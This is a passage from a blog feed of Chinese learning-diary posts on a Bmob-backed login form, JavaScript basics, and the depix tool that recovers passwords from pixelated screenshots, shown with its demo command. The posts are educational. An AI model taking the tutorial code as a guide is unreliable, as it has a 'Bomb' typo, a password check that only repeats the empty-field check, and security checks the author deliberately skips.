id="添加注册登录事件"><a href="#添加注册登录事件" class="headerlink" title="添加注册登录事件"></a>添加注册登录事件</h2><p>在按钮处添加<code>onclick</code>事件,并且修改一下id。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;#&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;input-container&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;#&#123;type&#125;&quot;</span> <span class="attr">id</span>=<span class="string">&quot;login_u&quot;</span> <span class="attr">required</span>=<span class="string">&quot;required&quot;</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;#&#123;label&#125;&quot;</span>&gt;</span>用户名<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;bar&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;input-container&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;#&#123;type&#125;&quot;</span> <span class="attr">id</span>=<span class="string">&quot;login_p&quot;</span> <span class="attr">required</span>=<span class="string">&quot;required&quot;</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;#&#123;label&#125;&quot;</span>&gt;</span>密码<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;bar&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;button-container&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">button</span> <span class="attr">onclick</span>=<span class="string">&quot;login(event)&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">span</span>&gt;</span>登录<span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params">e</span>)</span></span><br><span class="line"><span class="function"></span>&#123;Bmob.User.login(<span class="built_in">document</span>.getElementById(<span class="string">&quot;login_u&quot;</span>).value,<span class="built_in">document</span>.getElementById(<span class="string">&quot;login_p&quot;</span>).value).then(<span class="function"><span class="params">res</span> =&gt;</span> &#123;</span><br><span class="line">    alert(<span class="string">&quot;success&quot;</span>);</span><br><span class="line">    <span class="built_in">console</span>.log(res)</span><br><span class="line">  &#125;).catch(<span class="function"><span class="params">err</span> =&gt;</span> &#123;</span><br><span class="line">    alert(<span class="string">&quot;false&quot;</span>);</span><br><span class="line">   <span class="built_in">console</span>.log(err)</span><br><span class="line"> &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注册页面同理</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">  <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;#&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;input-container&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;#&#123;type&#125;&quot;</span> <span class="attr">id</span>=<span class="string">&quot;register_u&quot;</span> <span class="attr">required</span>=<span class="string">&quot;required&quot;</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;#&#123;label&#125;&quot;</span>&gt;</span>用户名<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;bar&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;input-container&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;#&#123;type&#125;&quot;</span> <span class="attr">id</span>=<span class="string">&quot;register_p&quot;</span> <span class="attr">required</span>=<span class="string">&quot;required&quot;</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;#&#123;label&#125;&quot;</span>&gt;</span>密码<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;bar&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;input-container&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;#&#123;type&#125;&quot;</span> <span class="attr">id</span>=<span class="string">&quot;register_p2&quot;</span> <span class="attr">required</span>=<span class="string">&quot;required&quot;</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;#&#123;label&#125;&quot;</span>&gt;</span>确认密码<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;bar&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;button-container&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">button</span> <span class="attr">onclick</span>=<span class="string">&quot;register(event)&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">span</span>&gt;</span>提交注册<span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">register</span>(<span class="params">e</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">let</span> params = </span><br><span class="line">  &#123;</span><br><span class="line">    <span class="attr">username</span>: <span class="built_in">document</span>.getElementById(<span class="string">&quot;register_u&quot;</span>).value,</span><br><span class="line">    <span class="attr">password</span>: <span class="built_in">document</span>.getElementById(<span class="string">&quot;register_p&quot;</span>).value,</span><br><span class="line">  &#125;</span><br><span class="line">Bomb.User.register(params).then(<span class="function"><span class="params">res</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(res)</span><br><span class="line">    alert(<span class="string">&quot;success&quot;</span>);</span><br><span class="line">    <span class="built_in">window</span>.location.href=<span class="string">&quot;welcome.html&quot;</span>;</span><br><span class="line">  &#125;).catch(<span class="function"><span class="params">err</span> =&gt;</span> &#123;</span><br><span class="line">    alert(<span class="string">&quot;false&quot;</span>);</span><br><span class="line">   <span class="built_in">console</span>.log(err)</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="测试注册登录"><a href="#测试注册登录" class="headerlink" title="测试注册登录"></a>测试注册登录</h2><p>测试一下注册<br><a href="https://imgchr.com/i/rhTXPP"><img src="https://s3.ax1x.com/2020/12/26/rhTXPP.png" alt="rhTXPP.png"></a><br>查询一下后端云的结果-<br><a href="https://imgchr.com/i/rh7UqH"><img src="https://s3.ax1x.com/2020/12/26/rh7UqH.png" alt="rh7UqH.png"></a><br>这样子一个简单的壳就弄好了。同理可用于微信小程序当中。<br><a href="https://imgchr.com/i/rh72LQ"><img src="https://s3.ax1x.com/2020/12/26/rh72LQ.png" alt="rh72LQ.png"></a></p><h1 id="表单验证"><a href="#表单验证" class="headerlink" title="表单验证"></a>表单验证</h1><p>JavaScript 可用来在数据被送往服务器前对 HTML 表单中的这些输入数据进行验证。</p><p>表单数据经常需要使用 JavaScript 来验证其正确性</p><h2 id="验证必填项目"><a href="#验证必填项目" class="headerlink" title="验证必填项目"></a>验证必填项目</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="built_in">document</span>.getElementById(<span class="string">&quot;login_u&quot;</span>).value==<span class="string">&quot;&quot;</span> || <span class="built_in">document</span>.getElementById(<span class="string">&quot;login_p&quot;</span>).value==<span class="string">&quot;&quot;</span>)</span><br><span class="line">&#123;</span><br><span class="line"> alert(<span class="string">&quot;请输入用户名和密码&quot;</span>);</span><br><span class="line"> <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="验证两次密码是否一致"><a href="#验证两次密码是否一致" class="headerlink" title="验证两次密码是否一致"></a>验证两次密码是否一致</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="built_in">document</span>.getElementById(<span class="string">&quot;login_u&quot;</span>).value==<span class="string">&quot;&quot;</span> || <span class="built_in">document</span>.getElementById(<span class="string">&quot;login_p&quot;</span>).value==<span class="string">&quot;&quot;</span>)</span><br><span class="line">&#123;</span><br><span class="line"> alert(<span class="string">&quot;请输入用户名和密码&quot;</span>);</span><br><span class="line"> <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><p>表单验证其实是一个很复杂的过程，从规范层面来说，可能需要检测输入是否合法，从安全角度来说，需要检测是否存在sql注入等，这里面的检测暂且忽略安全问题。</p><h1 id="登录状态保持"><a href="#登录状态保持" class="headerlink" title="登录状态保持"></a>登录状态保持</h1><p>用户登录不得不去解决登录状态保持的问题（可能专业一点称为”保持会话“），一般可以通过<code>cookie</code>去维持。<br>Cookie 是一些数据, 存储于你电脑上的文本文件中。<br>当 web 服务器向浏览器发送 web 页面时，在连接关闭后，服务端不会记录用户的信息。<br>Cookie 的作用就是用于解决 “如何记录客户端的用户信息”</p><p>Cookie 以名/值对形式存储<code>username=John Doe</code></p><h2 id="设置cookie函数"><a href="#设置cookie函数" class="headerlink" title="设置cookie函数"></a>设置cookie函数</h2><p>新建<code>welcome.html</code>设置代码</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">setCookie</span>(<span class="params">cname,cvalue,exdays</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">var</span> d = <span class="keyword">new</span> <span class="built_in">Date</span>();</span><br><span class="line">  d.setTime(d.getTime()+(exdays*<span class="number">24</span>*<span class="number">60</span>*<span class="number">60</span>*<span class="number">1000</span>));</span><br><span class="line">  <span class="keyword">var</span> expires = <span class="string">&quot;expires=&quot;</span>+d.toGMTString();</span><br><span class="line">  <span class="built_in">document</span>.cookie = cname + <span class="string">&quot;=&quot;</span> + cvalue + <span class="string">&quot;; &quot;</span> + expires;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="获取cookie的函数"><a href="#获取cookie的函数" class="headerlink" title="获取cookie的函数"></a>获取cookie的函数</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getCookie</span>(<span class="params">cname</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">var</span> name = cname + <span class="string">&quot;=&quot;</span>;</span><br><span class="line">  <span class="keyword">var</span> ca = <span class="built_in">document</span>.cookie.split(<span class="string">&#x27;;&#x27;</span>);</span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>; i&lt;ca.length; i++) </span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">var</span> c = ca[i].trim();</span><br><span class="line">    <span class="keyword">if</span> (c.indexOf(name)==<span class="number">0</span>) <span class="keyword">return</span> c.substring(name.length,c.length);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="嵌入js代码"><a href="#嵌入js代码" class="headerlink" title="嵌入js代码"></a>嵌入js代码</h2><p>在登录表单成功后添加下面的代码，设置登录状态。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setCookie(<span class="string">&quot;username&quot;</span>,<span class="built_in">document</span>.getElementById(<span class="string">&quot;login_u&quot;</span>).value,<span class="number">365</span>);</span><br></pre></td></tr></table></figure><p>设置页面重定向</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">window</span>.location.href=<span class="string">&quot;welcome.html&quot;</span>;</span><br></pre></td></tr></table></figure><p>在<code>welcome.html</code>设置显示cookie</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">alert(getCookie(<span class="string">&quot;username&quot;</span>));</span><br></pre></td></tr></table></figure><p>登录以后可以看到后台缓存了<code>cookie</code></p><p><a href="https://imgchr.com/i/r4SiCQ"><img src="https://s3.ax1x.com/2020/12/26/r4SiCQ.png" alt="r4SiCQ.png"></a></p><p><del>有一个很奇妙的东西：经测试谷歌浏览器无法在本地文件保存cookie，火狐可以。</del></p><h1 id="写在后面"><a href="#写在后面" class="headerlink" title="写在后面"></a>写在后面</h1><p>算是终于把一个（拿得出手）的正常表单完成了，个人感觉表单不论是对于开发还是对于安全的意义还是十分重要的，写完发现-<code>php</code>好像不见了。随着后端的发展和成熟，越来越多的工作交给云后端或许正是趋势，可能不久的将来，将会有更多如同react、node.js出现。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;随着后端的完善，许多后端云服务浮起水面&lt;/p&gt;</summary>
    
    
    
    <category term="码农日常" scheme="http://favorhau.github.io/categories/%E7%A0%81%E5%86%9C%E6%97%A5%E5%B8%B8/"/>
    
    
    <category term="JavaScript" scheme="http://favorhau.github.io/tags/JavaScript/"/>
    
    <category term="数据库" scheme="http://favorhau.github.io/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/"/>
    
  </entry>
  
  <entry>
    <title>20201225学习日记-初识Javascript</title>
    <link href="http://favorhau.github.io/2020/12/25/20201225%E5%AD%A6%E4%B9%A0%E6%97%A5%E8%AE%B0-%E5%88%9D%E8%AF%86Javascript/"/>
    <id>http://favorhau.github.io/2020/12/25/20201225%E5%AD%A6%E4%B9%A0%E6%97%A5%E8%AE%B0-%E5%88%9D%E8%AF%86Javascript/</id>
    <published>2020-12-25T02:19:45.000Z</published>
    <updated>2021-09-06T01:28:26.274Z</updated>
    
    <content type="html"><![CDATA[<p>前面<em>粗略</em>了解了一下HTML和CSS，接下来该到了不可或缺的JavaScript了。</p><span id="more"></span><p><strong>JavaScript (JS) is a lightweight, interpreted, or just-in-time compiled programming language with first-class functions</strong><br>在这里记录一下学习过程中的小收获吧。</p><h1 id="变量：let与var"><a href="#变量：let与var" class="headerlink" title="变量：let与var"></a>变量：let与var</h1><p>第一次见到这样的两种变量的声明方式<br><em>var and let are both used for variable declaration in javascript but the difference between them is that var is function scoped and let is block scoped.<br>It can be said that a variable declared with var is defined throughout the program as compared to let.</em><br>ES6新增了let命令，用来声明局部变量。用法类似于var。但是所声明的变量，只在let命令所在的代码块内有效。<br>二者的区别有</p><h2 id="1-let只在块内有效"><a href="#1-let只在块内有效" class="headerlink" title="1. let只在块内有效"></a>1. let只在块内有效</h2><p>先看用到 var 的一段代码。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">doSomething</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">5</span>; i++) &#123;</span><br><span class="line">        <span class="built_in">console</span>.log(i)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&#x27;Finally &#x27;</span> + i)</span><br><span class="line">&#125;</span><br><span class="line">doSomething()</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">0</span><br><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">Finally 5</span><br></pre></td></tr></table></figure><p>再看用到 let 的一段代码。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">doSomething</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">5</span>; i++) &#123;</span><br><span class="line">        <span class="built_in">console</span>.log(i)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&#x27;Finally &#x27;</span> + i)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">doSomething()</span><br></pre></td></tr></table></figure><p>打印结果如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">0</span><br><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">/Users/dkvirus/Documents/study/study-typescript/ex1/var.js:5</span><br><span class="line">    console.log(<span class="string">&#x27;Finally &#x27;</span> + i)</span><br><span class="line">ReferenceError: i is not defined</span><br></pre></td></tr></table></figure><h2 id="2-变量提升"><a href="#2-变量提升" class="headerlink" title="2. 变量提升"></a>2. 变量提升</h2><p>使用 let 语句声明一个变量，该变量的范围限于声明它的块中。 可以在声明变量时为变量赋值，也可以稍后在脚本中给变量赋值。 </p><p>使用 let 声明的变量，在声明前无法使用，否则将会导致错误。</p><h1 id="语法结构"><a href="#语法结构" class="headerlink" title="语法结构"></a>语法结构</h1><p>javascript许多语法的设计是参考Java的，而Java的语法是参考C的，而也有轻微差异。</p><h2 id="JavaScript数据类型"><a href="#JavaScript数据类型" class="headerlink" title="JavaScript数据类型"></a>JavaScript数据类型</h2><p>JavaScript 变量能够保存多种<em>数据类型</em>：数值、字符串值、数组、对象等等：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> length = <span class="number">7</span>;                             <span class="comment">// 数字</span></span><br><span class="line"><span class="keyword">var</span> lastName = <span class="string">&quot;Gates&quot;</span>;                      <span class="comment">// 字符串</span></span><br><span class="line"><span class="keyword">var</span> cars = [<span class="string">&quot;Porsche&quot;</span>, <span class="string">&quot;Volvo&quot;</span>, <span class="string">&quot;BMW&quot;</span>];         <span class="comment">// 数组</span></span><br><span class="line"><span class="keyword">var</span> x = &#123;<span class="attr">firstName</span>:<span class="string">&quot;Bill&quot;</span>, <span class="attr">lastName</span>:<span class="string">&quot;Gates&quot;</span>&#125;;    <span class="comment">// 对象 </span></span><br></pre></td></tr></table></figure><h2 id="JavaScript函数"><a href="#JavaScript函数" class="headerlink" title="JavaScript函数"></a>JavaScript函数</h2><p>js函数和C最大的特点在于，js不需要声明数据类型，而数据类型有一种（“隐式转换”）的感觉，</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">myFunction</span>(<span class="params">p1, p2</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> p1 * p2;              <span class="comment">// 该函数返回 p1 和 p2 的乘积</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="JavaScript指针？"><a href="#JavaScript指针？" class="headerlink" title="JavaScript指针？"></a>JavaScript指针？</h2><p>JavaScript不存在指针<br>通过传递引用的副本来传递对象。程序员无法访问任何表示对象地址的类似C的“值”。在一个函数中,可以通过该引用更改传递的对象的内容,但是您不能修改调用者拥有的引用,因为您的引用只是一个副本。</p><h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><p>JavaScript的语法结构，包括对于object对象的声明处理等，都和C有着一些差异，这里不做记录。</p><h1 id="HTML-DOM"><a href="#HTML-DOM" class="headerlink" title="HTML DOM"></a>HTML DOM</h1><p>说道JavaScript就不得不说HTML DOM，DOM (Document Object Model) 译为<strong>文档对象模型</strong>，是 HTML 和 XML 文档的编程接口。</p><p>在这里用runoob的一张图。<br><img src="https://www.runoob.com/images/htmltree.gif"></p><p>可以理解为，html上的组件，都有一个接口事件，而js可以监听相关事件，当产生事件时可以进行一系列的操作。</p><h1 id="写在后面"><a href="#写在后面" class="headerlink" title="写在后面"></a>写在后面</h1><p>这篇仅仅记录一下学习过程中的心得，很多实际需要用到的比如说node.js都没有记录在此，希望下一篇能记录下node.js的相关。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;前面&lt;em&gt;粗略&lt;/em&gt;了解了一下HTML和CSS，接下来该到了不可或缺的JavaScript了。&lt;/p&gt;</summary>
    
    
    
    <category term="码农日常" scheme="http://favorhau.github.io/categories/%E7%A0%81%E5%86%9C%E6%97%A5%E5%B8%B8/"/>
    
    
    <category term="JavaScript" scheme="http://favorhau.github.io/tags/JavaScript/"/>
    
  </entry>
  
  <entry>
    <title>depix-马赛克逆转神器</title>
    <link href="http://favorhau.github.io/2020/12/22/depix-%E9%A9%AC%E8%B5%9B%E5%85%8B%E9%80%86%E8%BD%AC%E7%A5%9E%E5%99%A8/"/>
    <id>http://favorhau.github.io/2020/12/22/depix-%E9%A9%AC%E8%B5%9B%E5%85%8B%E9%80%86%E8%BD%AC%E7%A5%9E%E5%99%A8/</id>
    <published>2020-12-22T04:29:26.000Z</published>
    <updated>2021-09-06T01:28:49.729Z</updated>
    
    <content type="html"><![CDATA[<p>最近有一个开源项目depix在github上面很火–通过特定的算法可将马赛克恢复。</p><span id="more"></span><p>公众号等纷纷对其具体展开。<br><a href="https://imgchr.com/i/rDK8Rs"><img src="https://s3.ax1x.com/2020/12/22/rDK8Rs.md.jpg" alt="rDK8Rs.md.jpg"></a><br>对，就是这个depix！<br><a href="https://imgchr.com/i/rDKDJJ"><img src="https://s3.ax1x.com/2020/12/22/rDKDJJ.md.jpg" alt="rDKDJJ.md.jpg"></a><br>站在巨人的肩膀上，来体验一下有趣的世界。</p><h1 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h1><p>为什么要写此文章呢？一来我觉得这个project十分有趣，能颠倒我的认识；二来有一点直觉，CTF可以围绕着这个方向去出题（如果不知道这个的话恐怕就做不了了）。所以就有了下面的文字。</p><h1 id="预期准备"><a href="#预期准备" class="headerlink" title="预期准备"></a>预期准备</h1><ul><li><strong>安装python</strong><br>我觉得这一步可以直接略过，安装python和配置环境变量</li><li><strong>下载GitHub上的depix文件</strong><br>&lt;a herf=”#可能遇到的问题” οnclick=”js_method()”&gt;可能遇到的问题</a><h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1></li></ul><p>来看一下项目的介绍<br><em>Depix is a tool for recovering passwords from pixelized screenshots.<br>This implementation works on pixelized images that were created with a linear box filter.<br>In this article I cover background information on pixelization and similar research.</em><br><strong>一个可以将马赛克化后截图恢复的工具</strong></p><p>作者给出的使用示例为</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python depix.py -p images/testimages/testimage3_pixels.png -s images/searchimages/debruinseq_notepad_Windows10_closeAndSpaced.png -o output.png</span><br></pre></td></tr></table></figure><h1 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h1><h2 id="从屏幕快照中将像素块切为单个矩形"><a href="#从屏幕快照中将像素块切为单个矩形" class="headerlink" title="从屏幕快照中将像素块切为单个矩形"></a>从屏幕快照中将像素块切为单个矩形</h2><p>在这里作者给出的示例图1为<br><a href="https://imgchr.com/i/rDQi3d"><img src="https://s3.ax1x.com/2020/12/22/rDQi3d.png" alt="rDQi3d.png"></a></p><h2 id="在具有相同字体设置（文本大小，字体，颜色，hsl）的编辑器中，粘贴带有预期字符的De-Bruijn序列，制作序列的屏幕截图"><a href="#在具有相同字体设置（文本大小，字体，颜色，hsl）的编辑器中，粘贴带有预期字符的De-Bruijn序列，制作序列的屏幕截图" class="headerlink" title="在具有相同字体设置（文本大小，字体，颜色，hsl）的编辑器中，粘贴带有预期字符的De Bruijn序列，制作序列的屏幕截图"></a>在具有相同字体设置（文本大小，字体，颜色，hsl）的编辑器中，粘贴带有预期字符的De Bruijn序列，制作序列的屏幕截图</h2><p>作者给出的序列为<br><a href="https://imgchr.com/i/rDQw8J"><img src="https://s3.ax1x.com/2020/12/22/rDQw8J.png" alt="rDQw8J.png"></a><br>说白了也就相当于一个图像字典吧。</p><h2 id="运行"><a href="#运行" class="headerlink" title="运行"></a>运行</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python depix.py -p [pixelated rectangle image] -s [search sequence image] -o output.png</span><br></pre></td></tr></table></figure><ul><li>[pixelated rectangle image] 这个参数是指被像素化后的图片</li><li>[search sequence image] 指序列化图像（字典）</li><li>-o 输出目录</li></ul><p>进入指定的目录，使用cmd。在文件目录下输入</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python depix.py -p images/testimages/testimage1.png -s images/searchimages/debruinseq_notepad_Windows10_closeAndSpaced.png -o 